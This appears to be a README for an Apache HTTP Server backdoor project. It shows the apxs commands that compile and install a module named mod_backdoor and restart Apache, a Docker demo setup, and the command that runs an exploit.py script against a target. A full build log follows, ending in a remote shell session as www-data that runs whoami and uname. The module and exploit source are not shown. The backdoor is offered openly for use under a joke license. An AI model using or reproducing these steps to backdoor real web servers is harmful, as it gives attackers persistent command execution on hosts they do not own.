# Backdoor for Apache HTTP Server

## Getting Started

Starting the exploited demo server in Docker

```bash
docker compose up
```

Run the exploit script

```bash
python exploit.py [HOST] [PORT]
```

Example:
```
root@kali:~/backdoor# apxs -i -a -c mod_backdoor.c && service apache2 restart
/usr/share/apr-1.0/build/libtool  --mode=compile --tag=disable-static x86_64-linux-gnu-gcc -prefer-pic -pipe -g -O2 -fstack-protector-strong -Wformat -Werror=format-security  -Wdate-time -D_FORTIFY_SOURCE=2   -DLINUX -D_REENTRANT -D_GNU_SOURCE  -pthread  -I/usr/include/apache2  -I/usr/include/apr-1.0   -I/usr/include/apr-1.0 -I/usr/include  -c -o mod_backdoor.lo mod_backdoor.c && touch mod_backdoor.slo
libtool: compile:  x86_64-linux-gnu-gcc -pipe -g -O2 -fstack-protector-strong -Wformat -Werror=format-security -Wdate-time -D_FORTIFY_SOURCE=2 -DLINUX -D_REENTRANT -D_GNU_SOURCE -pthread -I/usr/include/apache2 -I/usr/include/apr-1.0 -I/usr/include/apr-1.0 -I/usr/include -c mod_backdoor.c  -fPIC -DPIC -o .libs/mod_backdoor.o
/usr/share/apr-1.0/build/libtool  --mode=link --tag=disable-static x86_64-linux-gnu-gcc -Wl,--as-needed -Wl,-z,relro -Wl,-z,now    -o mod_backdoor.la  -rpath /usr/lib/apache2/modules -module -avoid-version    mod_backdoor.lo
libtool: link: rm -fr  .libs/mod_backdoor.la .libs/mod_backdoor.lai .libs/mod_backdoor.so
libtool: link: x86_64-linux-gnu-gcc -shared  -fPIC -DPIC  .libs/mod_backdoor.o    -Wl,--as-needed -Wl,-z -Wl,relro -Wl,-z -Wl,now   -Wl,-soname -Wl,mod_backdoor.so -o .libs/mod_backdoor.so
libtool: link: ( cd ".libs" && rm -f "mod_backdoor.la" && ln -s "../mod_backdoor.la" "mod_backdoor.la" )
/usr/share/apache2/build/instdso.sh SH_LIBTOOL='/usr/share/apr-1.0/build/libtool' mod_backdoor.la /usr/lib/apache2/modules
/usr/share/apr-1.0/build/libtool --mode=install install mod_backdoor.la /usr/lib/apache2/modules/
libtool: install: install .libs/mod_backdoor.so /usr/lib/apache2/modules/mod_backdoor.so
libtool: install: install .libs/mod_backdoor.lai /usr/lib/apache2/modules/mod_backdoor.la
libtool: finish: PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/sbin" ldconfig -n /usr/lib/apache2/modules
----------------------------------------------------------------------
Libraries have been installed in:
   /usr/lib/apache2/modules

If you ever happen to want to link against installed libraries
in a given directory, LIBDIR, you must either use libtool, and
specify the full pathname of the library, or use the '-LLIBDIR'
flag during linking and do at least one of the following:
   - add LIBDIR to the 'LD_LIBRARY_PATH' environment variable
     during execution
   - add LIBDIR to the 'LD_RUN_PATH' environment variable
     during linking
   - use the '-Wl,-rpath -Wl,LIBDIR' linker flag
   - have your system administrator add LIBDIR to '/etc/ld.so.conf'

See any operating system documentation about shared libraries for
more information, such as the ld(1) and ld.so(8) manual pages.
----------------------------------------------------------------------
chmod 644 /usr/lib/apache2/modules/mod_backdoor.so
[preparing module `backdoor' in /etc/apache2/mods-available/backdoor.load]
Module backdoor already enabled
root@kali:~/backdoor# python exploit.py 127.0.0.1 80
$ whoami
www-data

$ uname -a
Linux kali 4.13.0-kali1-amd64 #1 SMP Debian 4.13.10-1kali2 (2017-11-08) x86_64 GNU/Linux

$ exit

```

License
```
THE DRINKWARE LICENSE

<wangyihanger@gmail.com> wrote this file. As long as 
you retain this notice you can do whatever you want 
with this stuff. If we meet some day, and you think 
this stuff is worth it, you can buy me the following
drink(s) in return.

Red Bull
JDB
Coffee
Sprite
Cola
Harbin Beer
etc
```
